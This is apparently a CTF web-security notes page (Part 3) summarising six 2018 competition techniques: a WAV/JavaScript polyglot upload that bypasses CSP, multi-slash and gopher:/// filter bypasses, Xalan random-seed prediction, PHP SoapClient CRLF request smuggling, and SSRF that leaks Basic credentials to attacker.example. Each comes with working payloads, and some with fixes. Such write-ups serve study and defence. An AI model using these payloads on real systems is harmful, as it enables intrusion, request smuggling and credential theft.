# CTF Web - Advanced Server-Side Techniques (Part 3)

CVE-era and 2018-era advanced server-side techniques (CSAW, 35C3, ASIS, PlaidCTF). For parts 1-2, see [server-side-advanced.md](server-side-advanced.md) and [server-side-advanced-2.md](server-side-advanced-2.md).

## Table of Contents
- [WAV Polyglot Upload Bypass via .wave Extension (PlaidCTF 2018)](#wav-polyglot-upload-bypass-via-wave-extension-plaidctf-2018)
- [Multi-Slash URL Parser `path.startswith` Bypass (CSAW 2018 Finals)](#multi-slash-url-parser-pathstartswith-bypass-csaw-2018-finals)
- [Xalan XSLT math:random() Seed Guess (35C3 2018)](#xalan-xslt-mathrandom-seed-guess-35c3-2018)
- [SoapClient _user_agent CRLF Method Smuggling (35C3 2018)](#soapclient-_user_agent-crlf-method-smuggling-35c3-2018)
- [`gopher://` No-Host URL Scheme Bypass (35C3 2018)](#gopher-no-host-url-scheme-bypass-35c3-2018)
- [SSRF Credential Leak via Attacker-Specified Outbound URL (ASIS Finals 2018)](#ssrf-credential-leak-via-attacker-specified-outbound-url-asis-finals-2018)

---

---

## WAV Polyglot Upload Bypass via .wave Extension (PlaidCTF 2018)

**Pattern (idIoT: Action):** Site accepts `ogg/wav/wave/webm/mp3` uploads and validates by parsing the RIFF/WAVE header. CSP is `script-src 'self'`, so inline XSS fails, but a same-origin `<script src=...>` to an uploaded file would run. Browsers refuse to load responses whose Content-Type starts with `audio/`, yet Apache on many distros has no MIME mapping for the `.wave` extension and serves it as the default (usually `application/octet-stream` or with no `Content-Type`).

**Exploit build:**
1. Construct a file whose first bytes parse as a valid RIFF/WAVE container but whose `data` chunk contents open a JavaScript block comment and embed the payload.
2. Save with extension `.wave` (not `.wav`) so Apache does not label it as audio.
3. Inject `<script src="/uploads/evil.wave"></script>` via the existing XSS sink — the browser now executes the script from a same-origin URL, satisfying `script-src 'self'`.

```text
RIFF=1/*WAVEfmt ..........]................LIST....INFO
ISFT....Lavf57.83.100.data........................
........*/ ; alert(1);
```
Hex view (truncated): the first 4 bytes `52 49 46 46` still form `RIFF`; the quirky length field `3d 31 2f 2a` (`=1/*`) is valid for WAV parsers but also opens a JS comment that runs until the `*/ ;alert(1);` tail at the end of the `data` chunk.

**Key insight:** File-upload filters that only check magic bytes or MIME based on extension are defeated by any extension the web server has no explicit mapping for. Test each permitted extension against the server's MIME database (`mime.types`) — whichever one falls through to `application/octet-stream` becomes a script gadget under `script-src 'self'`. Fix by enforcing a strict response `Content-Type` for user uploads (e.g., `application/octet-stream` + `Content-Disposition: attachment`).

**References:** PlaidCTF 2018 — writeup 10018

---

## Multi-Slash URL Parser `path.startswith` Bypass (CSAW 2018 Finals)

**Pattern:** Server code rejects URLs whose parsed path starts with `/flaginfo`, but most HTTP stacks resolve consecutive slashes equivalently. Adding one extra slash shifts the parsed path to `//flaginfo`, breaking `startswith("/flaginfo")` while still routing to the real endpoint.

```text
# Filtered
http://127.0.0.1:5000/flaginfo
# Allowed
http://127.0.0.1:5000///flaginfo
```

**Key insight:** Filters that check the parsed URL differ from the resolver that ultimately routes the request. Always test `///`, `/./`, `%2f`, and `http:/127.0.0.1` permutations when the filter is a string-comparison, not a structural match.

**References:** CSAW 2018 Finals — NekoCat, writeups 12130, 12144

---

## Xalan XSLT math:random() Seed Guess (35C3 2018)

**Pattern:** Xalan's `math:random()` extension uses C `srand(time(NULL))`. The challenge leaks 5 consecutive random values; brute-force 3 consecutive seeds (`t-1`, `t`, `t+1`) with libc `rand()` to find the one matching the leak, then predict the next value.

```c
for (long base = time(NULL) - 1; base <= time(NULL) + 1; base++) {
    srand(base);
    for (int j = 0; j < 5; j++) {
        long long v = llround((double)rand() / RAND_MAX * 4294967296.0);
        /* compare with leaked values */
    }
}
```

**Key insight:** Any XSLT engine that exposes math extensions usually proxies straight to libc rand/srand; seeds are second-granularity time values and fall to a 3-value brute force.

**References:** 35C3 CTF 2018 — Juggle, writeup 12803

---

## SoapClient _user_agent CRLF Method Smuggling (35C3 2018)

**Pattern:** PHP's `SoapClient` lets user code set the `_user_agent` property. That string is interpolated into the HTTP request without CRLF filtering, so injecting `\r\n\r\n` followed by a full HTTP request smuggles a *second* request out of the same TCP connection — turning a POST-only primitive into a GET (or any other method) hitting a localhost-restricted admin endpoint.

```php
$c = new SoapClient(null, [
    'location'   => 'http://target/soap',
    'uri'        => 'x',
    'user_agent' => "x\r\nX-Forwarded-For: 127.0.0.1\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
]);
$c->__soapCall('x', []);
```

**Key insight:** Any serialization gadget that lets you set a "magic" HTTP header string in a deserialized object becomes an HTTP smuggler. `SoapClient->_user_agent` and `SoapClient->_cookies` are the typical PHP gadgets for this.

**References:** 35C3 CTF 2018 — post, writeup 12808

---

## `gopher://` No-Host URL Scheme Bypass (35C3 2018)

**Pattern:** An allowlist validator only enforces the scheme check when the URL has a host (`parsed.scheme in ('http','https') if parsed.host`). `gopher:///host:port/data` leaves the host empty in some parsers, skipping the check entirely, so the request backend uses gopher to talk to any TCP service — MSSQL, Redis, SMTP.

```text
gopher:///127.0.0.1:1433/_<raw TDS bytes>
```

**Key insight:** Always test every URL scheme against the validator both with and without `//host` because parser/validator mismatches are asymmetric. `gopher:///x`, `file:///x`, and `jar:file:///x` are the common scheme bypasses.

**References:** 35C3 CTF 2018 — post, writeup 12808

---

## SSRF Credential Leak via Attacker-Specified Outbound URL (ASIS Finals 2018)

**Pattern:** Server fetches resources from a user-controlled URL and attaches its own HTTP Basic credentials to the request. Point the URL at an attacker-controlled host; the inbound request arrives with `Authorization: Basic <base64(user:pass)>`.

```http
# Listener (attacker side)
nc -lvnp 80

# Victim sends:
GET / HTTP/1.1
Host: attacker.example
Authorization: Basic YmlnYnJvdGhlcjo0UWozcmM0WmhOUUt2N1J6
```

**Key insight:** Any SSRF where the client library uses per-request credentials (`requests.auth`, `urllib3 auth_header`, Python `http.client` default credentials) leaks them if the attacker picks the target URL. Strip `Authorization` on redirects and never attach credentials by default.

**References:** ASIS CTF Finals 2018 — Gunshop 2, writeup 12420
